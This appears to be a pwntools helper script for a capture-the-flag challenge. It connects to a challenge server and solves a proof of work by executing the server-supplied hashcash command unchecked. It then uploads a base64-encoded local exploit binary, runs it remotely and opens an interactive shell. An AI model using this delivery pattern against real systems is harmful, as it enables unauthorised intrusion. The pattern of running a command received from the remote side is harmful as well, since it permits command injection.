#!/usr/bin/env python3
import subprocess
from base64 import b64encode

from pwn import *

# context.log_level = "DEBUG"
HOST = args.HOST if args.HOST else "localhost"
PORT = int(args.PORT) if args.PORT else 1337
SSL = args.SSL


io = remote(HOST, PORT, ssl=SSL)
if args.TEAM_TOKEN:
    io.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())


if args.POW:
    io.recvuntil(b"proof of work:\n")
    hashcash_cmd = io.recvline(drop=True)
    stamp = subprocess.check_output(hashcash_cmd.split(b" "))
    io.sendlineafter(b"stamp: ", stamp.strip())


with open("./exploit", "rb") as f:
    exploit = b64encode(f.read())

    io.sendlineafter(b"b64 encoded exp len", str(len(exploit)).encode())
    io.send(exploit)

io.sendlineafter(b"~ $ ", b"/home/exploit")
io.interactive()
